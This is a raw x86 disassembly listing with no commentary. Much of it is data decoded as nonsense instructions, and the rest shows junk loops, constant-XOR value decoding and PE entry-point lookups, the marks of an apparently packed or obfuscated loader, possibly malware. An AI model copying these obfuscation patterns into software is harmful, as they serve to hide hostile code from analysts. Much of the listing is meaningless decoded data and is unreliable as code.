  40619b:	imul   ecx,DWORD PTR [ebp+0x38d43368],0x43
  4061a2:	ficomp WORD PTR ds:0x25ae205
  4061a8:	in     al,0x2d
  4061aa:	fs jecxz 0x4061e4
  4061ad:	dec    esi
  4061ae:	fldln2 
  4061b0:	test   edx,esp
  4061b2:	pop    esi
  4061b3:	das    
  4061b4:	(bad)  
  4061b6:	fwait
  4061b7:	xchg   ebx,eax
  4061b8:	mov    DWORD PTR [eax],edx
  4061ba:	cli    
  4061bb:	sub    eax,0x3ea58cd2
  4061c0:	pop    ebx
  4061c1:	mov    ah,bh
  4061c3:	and    al,0xf
  4061c5:	dec    ebx
  4061c6:	cwde   
  4061c7:	(bad)  
  4061c8:	aad    0x9a
  4061ca:	data16 cmp al,0x3a
  4061cd:	and    DWORD PTR [edx-0x1a7c7958],ecx
  4061d3:	xor    DWORD PTR [edi],0x5ce481dc
  4061d9:	or     ebx,DWORD PTR [ebx-0x7d]
  4061dc:	xchg   cl,al
  4061de:	pop    ss
  4061df:	jbe    0x406225
  4061e1:	xchg   edx,eax
  4061e2:	retf   
  4061e3:	stc    
  4061e4:	(bad)  
  4061e5:	sbb    ch,ah
  4061e7:	xchg   edi,eax
  4061e8:	inc    eax
  4061e9:	ds push ebx
  4061eb:	sbb    BYTE PTR [ecx+0x65],al
  4061ee:	inc    edx
  4061ef:	aad    0x82
  4061f1:	mov    al,ds:0xcc68e7f3
  4061f6:	or     BYTE PTR [eax+eiz*4],0x9f
  4061fa:	mov    es,WORD PTR [ecx+0x7d]
  4061fd:	lods   al,BYTE PTR ds:[esi]
  4061fe:	sbb    edi,DWORD PTR [ecx+0x5f]
  406201:	push   ebp
  406202:	and    al,0x78
  406204:	push   eax
  406205:	loope  0x4061b5
  406207:	loopne 0x406234
  406209:	retf   
  40620a:	lea    edi,[edi-0x27e0f92]
  406210:	fbld   TBYTE PTR [edx-0x6482251f]
  406216:	push   0x97934eee
  40621b:	add    esp,ecx
  40621d:	mov    ds:0xa1a26a56,al
  406222:	out    0xb0,al
  406224:	in     eax,0xa
  406226:	add    al,0xf8
  406228:	cld    
  406229:	pop    es
  40622a:	mov    dh,0x55
  40622c:	jne    0x4061fb
  40622e:	(bad)
  406231:	adc    BYTE PTR [edx],dl
  406233:	loop   0x406266
  406235:	or     eax,0xeddaca50
  40623a:	inc    edi
  40623b:	clc    
  40623c:	or     eax,0xdfb29ea9
  406241:	and    DWORD PTR [edx+0x5c],ebp
  406244:	jo     0x406229
  406246:	adc    al,0xfd
  406248:	add    eax,0x76e18fc6
  40624d:	pop    esi
  40624e:	mov    esi,0xd3187b2f
  406253:	shr    DWORD PTR [esi-0x10],0x7d
  406257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406258:	out    0xc6,al
  40625a:	and    eax,0xe3fce5e9
  40625f:	test   DWORD PTR [eax+0x33bb5aab],edx
  406265:	lock and DWORD PTR ds:0x433723,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x433723
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433723,ecx
  406282:	cmp    DWORD PTR ds:0x433723,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433723,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433723,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433723
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433723,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	xchg   edx,eax
  406312:	pop    eax
  406313:	repz (bad) 
  406315:	push   esp
  406316:	aas    
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	test   al,0xa4
  40631f:	or     dl,0xf8
  406322:	pop    es
  406323:	stos   BYTE PTR es:[edi],al
  406324:	jb     0x4062c1
  406326:	mov    ds:0x9f5d0e39,eax
  40632b:	mov    dh,0xe9
  40632d:	dec    edx
  40632e:	inc    eax
  40632f:	ret    0xad60
  406332:	push   esi
  406333:	mov    edi,0x87c843c2
  406338:	push   edi
  406339:	les    esp,FWORD PTR [edi+edx*8-0xb]
  40633d:	xchg   ebx,eax
  40633e:	inc    ebp
  40633f:	hlt    
  406340:	cmp    bl,dl
  406342:	lock imul edx,DWORD PTR [ecx],0x46761f6b
  406349:	imul   eax,eax,0xb9a84abb
  40634f:	dec    esi
  406350:	sbb    bh,0xde
  406353:	push   edi
  406354:	push   esi
  406355:	add    BYTE PTR [edi-0x4],dl
  406358:	pop    ds
  406359:	mov    dl,0xae
  40635b:	cmc    
  40635c:	and    ecx,DWORD PTR [esi+ecx*8-0x40]
  406360:	sti    
  406361:	(bad)  
  406362:	jno    0x4062e7
  406364:	mov    ch,0x7f
  406366:	sti    
  406367:	fwait
  406368:	sar    BYTE PTR [esi],cl
  40636a:	bound  edi,QWORD PTR [edx-0x5f]
  40636d:	arpl   WORD PTR [ecx-0x33],cx
  406370:	fisubr DWORD PTR [ebx-0x74b84fad]
  406376:	and    edx,DWORD PTR [eax]
  406378:	jg     0x406391
  40637a:	ds xor al,0x10
  40637d:	push   ss
  40637e:	mov    ch,0xe5
  406380:	dec    edi
  406381:	scas   eax,DWORD PTR es:[edi]
  406382:	int3   
  406383:	ficomp WORD PTR [esi]
  406385:	push   edx
  406386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406387:	adc    eax,0x98c21ecb
  40638c:	or     eax,0x885d6b43
  406391:	(bad)  [ebx-0x24dfe9a2]
  406397:	jg     0x4063de
  406399:	(bad)  
  40639a:	out    0x68,al
  40639c:	(bad)  
  40639d:	fcmovnbe st,st(0)
  40639f:	or     BYTE PTR [ebx-0x2431fd51],bh
  4063a5:	in     eax,0xb3
  4063a7:	out    dx,al
  4063a8:	cmp    ah,ch
  4063aa:	movups xmm4,xmm1
  4063ad:	retf   
  4063ae:	xlat   BYTE PTR ds:[ebx]
  4063af:	pop    ebx
  4063b0:	ret    
  4063b1:	mov    BYTE PTR ds:[eax+0x77],dh
  4063b5:	add    ch,bl
  4063b7:	xchg   edi,eax
  4063b8:	dec    ecx
  4063b9:	(bad)  
  4063ba:	sub    DWORD PTR [eax+0x22a30c7f],ecx
  4063c0:	loop   0x40635c
  4063c2:	sub    ebp,DWORD PTR [esi+0x31]
  4063c5:	mov    al,ds:0xa3c1c05a
  4063ca:	add    eax,0xda26f0e4
  4063cf:	adc    eax,0x5c8fee36
  4063d4:	cmc    
  4063d5:	in     eax,dx
  4063d6:	fild   DWORD PTR [edx+ebp*4+0x2c57dbeb]
  4063dd:	rol    ah,cl
  4063df:	in     al,0x4c
  4063e1:	adc    eax,0x707fdcc5
  4063e6:	in     eax,0x87
  4063e8:	loope  0x4063d2
  4063ea:	mov    edi,0x553bd2f5
  4063ef:	adc    DWORD PTR [eax+0x62941673],0x6f63ce48
  4063f9:	call   0x366d295c
  4063fe:	cmp    eax,0x3c5f709f
  406403:	ds push ebp
  406405:	shr    DWORD PTR [eax],0x2f
  406408:	dec    esp
  406409:	dec    ebx
  40640a:	es pop edx
  40640c:	xchg   edi,eax
  40640d:	sar    DWORD PTR [ebx-0x64f6f125],cl
  406413:	stos   DWORD PTR es:[edi],eax
  406414:	aam    0x91
  406416:	in     al,dx
  406417:	arpl   WORD PTR [esi-0x7762e942],cx
  40641d:	add    al,0xa5
  40641f:	xchg   DWORD PTR [eax],eax
  406421:	xor    al,0xae
  406423:	out    0x5e,al
  406425:	or     DWORD PTR [eax-0x76000f70],ebp
  40642b:	in     al,0x4f
  40642d:	xor    DWORD PTR [edi],eax
  40642f:	pushf  
  406430:	les    edi,FWORD PTR [edx+0x30574c6]
  406436:	and    al,BYTE PTR [ecx]
  406438:	jecxz  0x4063d7
  40643a:	mov    ds:0x74d9206e,eax
  40643f:	imul   edx,DWORD PTR [ebp-0x25],0xc4d6fa56
  406446:	jl     0x4064be
  406448:	and    ah,BYTE PTR [ebp+0x62]
  40644b:	jge    0x4064c9
  40644d:	adc    al,0x7e
  40644f:	retf   
  406450:	mov    cl,0xc5
  406452:	loope  0x4063f2
  406454:	cmp    DWORD PTR [ecx-0xf],ecx
  406457:	sbb    BYTE PTR [edx],0x60
  40645a:	in     al,dx
  40645b:	or     DWORD PTR [ecx+ecx*8-0x75],ebp
  40645f:	idiv   BYTE PTR [ecx+0xd]
  406462:	mov    ah,dl
  406464:	shl    dh,1
  406466:	adc    al,0x71
  406468:	es jg  0x406412
  40646b:	sar    BYTE PTR [edx],1
  40646d:	mov    ah,ah
  40646f:	imul   ecx,esi,0xc8518bde
  406475:	jg     0x4064a7
  406477:	dec    esp
  406478:	and    BYTE PTR [ebp+0x11f2f86b],al
  40647e:	sbb    eax,DWORD PTR [eax+0xa]
  406481:	jle    0x406446
  406483:	xchg   esi,eax
  406484:	aas    
  406485:	or     DWORD PTR [ebp+0x2e],esp
  406488:	add    BYTE PTR [edi-0x46],ah
  40648b:	(bad)  
  40648d:	jnp    0x4064d9
  40648f:	leave  
  406490:	int3   
  406491:	mov    ah,0x5e
  406493:	fnstcw WORD PTR [esi]
  406495:	sbb    ebx,DWORD PTR [esi+0x70]
  406498:	push   esi
  406499:	pop    ebp
  40649a:	inc    eax
  40649b:	push   esp
  40649c:	adc    eax,0xe79132
  4064a1:	sbb    eax,0xe8128694
  4064a6:	(bad)  
  4064a7:	push   esi
  4064a8:	(bad)  
  4064a9:	fmul   QWORD PTR es:[edx+0x7ad41eb6]
  4064b0:	sti    
  4064b1:	xchg   ebx,eax
  4064b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064b3:	push   0xfffffff0
  4064b5:	lahf   
  4064b6:	pop    es
  4064b7:	retf   0xb2f6
  4064ba:	ins    DWORD PTR es:[edi],dx
  4064bb:	retf   
  4064bc:	push   esp
  4064bd:	or     ecx,eax
  4064bf:	pop    edi
  4064c0:	pop    ss
  4064c1:	mov    esi,0xaa16d33
  4064c6:	mov    DWORD PTR [ecx-0x55],esp
  4064c9:	xchg   esp,eax
  4064ca:	es out 0xec,eax
  4064cd:	sub    eax,0xc9d840f2
  4064d2:	mov    ch,0x73
  4064d4:	inc    esp
  4064d5:	out    dx,eax
  4064d6:	adc    BYTE PTR [esi-0x29127c59],ch
  4064dc:	repz dec edx
  4064de:	out    0xb,eax
  4064e0:	push   0xffffff88
  4064e2:	cmp    dh,BYTE PTR [ecx+0x15]
  4064e5:	xor    al,0xe1
  4064e7:	jnp    0x406530
  4064e9:	rcl    BYTE PTR [ecx-0x6a],1
  4064ec:	xchg   esi,eax
  4064ed:	mov    esi,0xa15250ee
  4064f2:	add    bl,ah
  4064f4:	repnz xor eax,0xdc332329
  4064fa:	sub    eax,0xabb47ba9
  4064ff:	sub    BYTE PTR [eax-0x66],bh
  406502:	icebp  
  406503:	enter  0x4810,0xcc
  406507:	xor    DWORD PTR [ebx],0x2f2f4df5
  40650d:	aas    
  40650e:	and    al,bh
  406510:	xchg   ebp,eax
  406511:	xchg   esp,eax
  406512:	pop    esi
  406513:	mov    BYTE PTR [edi],0xd9
  406516:	mov    ch,0xd9
  406518:	sar    ebp,1
  40651a:	push   0x77
  40651c:	ror    DWORD PTR [esi],0x42
  40651f:	mov    edx,0xa0ef657d
  406524:	int3   
  406525:	mov    eax,ds:0xd41d3044
  40652a:	lahf   
  40652b:	cmc    
  40652c:	fs out 0x61,eax
  40652f:	out    dx,eax
  406530:	mov    eax,ds:0xf7da944f
  406535:	push   es
  406536:	mov    ds:0xc5fa8853,eax
  40653b:	out    0x35,eax
  40653d:	rcl    BYTE PTR [eax-0x59],0x9f
  406541:	jl     0x406575
  406543:	nop    edx
  406546:	sbb    ecx,DWORD PTR [edi]
  406548:	aas    
  406549:	ficomp DWORD PTR [ebx+ebx*2]
  40654c:	dec    esi
  40654d:	xor    edi,DWORD PTR [ebx]
  40654f:	cvttps2pi mm5,QWORD PTR [edi+0x1d]
  406553:	pop    edi
  406554:	and    BYTE PTR [edi+0x32],0x5e
  406558:	push   ebp
  406559:	dec    ecx
  40655a:	mov    esi,0xcafac197
  40655f:	pop    edx
  406560:	retf   
  406561:	mov    al,ds:0x2df7c598
  406566:	inc    esp
  406567:	or     DWORD PTR [eax+0x74],ecx
  40656a:	inc    esi
  40656b:	es clc 
  40656d:	dec    ecx
  40656e:	out    dx,eax
  40656f:	mov    ds:0x6bde6cc4,eax
  406574:	icebp  
  406575:	pop    ebp
  406576:	jb     0x4065b4
  406578:	dec    esi
  406579:	dec    esp
  40657a:	cmc    
  40657b:	rcr    DWORD PTR [ebx],1
  40657d:	push   ebp
  40657e:	into   
  40657f:	jae    0x4065f1
  406581:	push   es
  406582:	lock sub BYTE PTR [edx+ecx*2-0x45d25a0e],al
  40658a:	inc    edi
  40658b:	mov    ecx,esp
  40658d:	popa   
  40658e:	leave  
  40658f:	jmp    0x4370:0xceaddc01
  406596:	dec    ebp
  406597:	xor    eax,0x9d283fc
  40659c:	jge    0x4065d5
  40659e:	sbb    al,0x68
  4065a0:	pop    ss
  4065a1:	cmp    DWORD PTR [ebx],esp
  4065a3:	js     0x40654d
  4065a5:	sar    BYTE PTR [ebx-0x73],cl
  4065a8:	sub    al,0x55
  4065aa:	xchg   ebp,eax
  4065ab:	xchg   ebx,eax
  4065ac:	gs pushf 
  4065ae:	xchg   ecx,eax
  4065af:	fidiv  WORD PTR [ebx]
  4065b1:	lods   al,BYTE PTR ds:[esi]
  4065b2:	cmp    dl,al
  4065b4:	mov    ds:0x9cf8ecdb,eax
  4065b9:	xor    edi,DWORD PTR [ebp+0x3ca0288]
  4065bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065c0:	push   0x9f7686b6
  4065c5:	inc    DWORD PTR [esi-0x47a671c9]
  4065cb:	call   0xdd8e:0x92459e6f
  4065d2:	shl    BYTE PTR [ebp-0x35],cl
  4065d5:	jne    0x406579
  4065d7:	(bad)  
  4065d8:	jns    0x406649
  4065da:	(bad)  
  4065db:	cmp    ebp,DWORD PTR [eax]
  4065dd:	add    DWORD PTR [ebx-0x42d5b808],edi
  4065e3:	in     eax,dx
  4065e4:	push   eax
  4065e5:	cld    
  4065e6:	jae    0x406587
  4065e8:	adc    al,0x52
  4065ea:	ret    
  4065eb:	mov    ds:0x3cf4ba49,al
  4065f0:	test   eax,0x5d0ccc36
  4065f5:	sar    DWORD PTR [ecx+0x4af4259e],cl
  4065fb:	push   edi
  4065fc:	pop    ds
  4065fd:	mov    DWORD PTR [ebx-0x22],0xcbd20d07
  406604:	xor    DWORD PTR [edx+0x6b6e7ada],0x5
  40660b:	push   edi
  40660c:	sbb    DWORD PTR [ebp-0x1e],edx
  40660f:	mov    ecx,0xd699f130
  406614:	jmp    0xbb48c9fe
  406619:	shl    BYTE PTR [ebp-0x41],1
  40661c:	(bad)  
  40661d:	icebp  
  40661e:	in     eax,0x65
  406620:	mov    esi,0x510aa788
  406625:	imul   ebp,DWORD PTR [ecx],0x9
  406628:	fiadd  DWORD PTR [eax]
  40662a:	dec    ecx
  40662b:	mov    edx,0x2a721e04
  406630:	xchg   edi,eax
  406631:	cdq    
  406632:	sbb    bh,BYTE PTR [edx+0x12]
  406635:	add    al,0xf6
  406637:	push   esi
  406638:	xchg   BYTE PTR ds:0x36c80c65,dh
  40663e:	xchg   ecx,eax
  40663f:	xchg   ebx,eax
  406640:	retf   0xafd3
  406643:	xor    eax,0xb8ea5a23
  406648:	push   esi
  406649:	sub    BYTE PTR [ecx+0x3a],dl
  40664c:	mov    esp,0xd0ff1d89
  406651:	jmp    0x406659
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4335fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4336d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4336a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4336e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4336e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4336e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4336e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433803
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4336e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4336e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4336e3,ecx
  406714:	cmp    DWORD PTR ds:0x4336e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4336d7
  406728:	and    ecx,DWORD PTR ds:0x43360f
  40672e:	mov    DWORD PTR ds:0x4336d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43361b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43372b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433613,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43366b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433607,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433607
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433607,ebx
  40677d:	cmp    DWORD PTR ds:0x433607,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433607,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433833
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4336ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433697,0x4336a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4336d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43366b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433613,0x43369f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433607,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4336af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4336e3
  40683c:	and    DWORD PTR ds:0x4336a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43372b
  40684d:	or     DWORD PTR ds:0x4336e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43365b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43371f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4336ab
  406870:	sub    DWORD PTR ds:0x4336d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43360b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433607,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433613,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43360f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433623,0x43372b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43369b,0x4336df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4336e7,0x433693
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433653,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43365b,0x4336ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4336ab,0x43366f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43365b,0x43369b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4335fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4335fb,0x433623
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4336db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4335ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4336ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43371b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43371b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43371b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43371b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43371b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433697
  4069db:	adc    ecx,DWORD PTR ds:0x43365f
  4069e1:	mov    DWORD PTR ds:0x433697,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433693,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433667,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433693,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43360f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43369b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43361b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x4336d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
